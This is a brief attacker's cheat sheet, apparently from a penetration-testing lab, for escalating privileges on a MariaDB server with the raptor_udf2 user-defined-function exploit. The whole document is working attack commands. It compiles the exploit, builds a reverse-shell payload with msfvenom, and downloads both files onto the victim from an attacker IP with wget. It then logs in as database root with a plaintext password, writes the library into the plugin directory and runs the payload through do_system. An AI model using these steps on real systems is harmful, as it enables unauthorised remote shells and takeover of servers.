# Name
Raptor_udf2.so

## Usage
```
On Kali:
searchsploit -m 1518
mv 1518.c raptor_udf2.c
 gcc -g -c raptor_udf2.c
 gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
msfvenom -p linux/x86/shell_reverse_tcp LHOST=tun0 LPORT=80 -f elf > non_staged.elf

On Victim:
wget http://192.168.45.214/raptor_udf2.so
wget http://192.168.45.214/non_staged.elf

Login to MariaDB server:
mysql -uroot -pPHfaaGe7769ll

On MariaDB server:
CREATE DATABASE poc;
use poc;
create table foo(line blob);
insert into foo values(load_file('/home/mario/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select * from mysql.func;
select do_system('/home/mario/non_staged.elf');
```

## Source
https://www.exploit-db.com/raw/1518

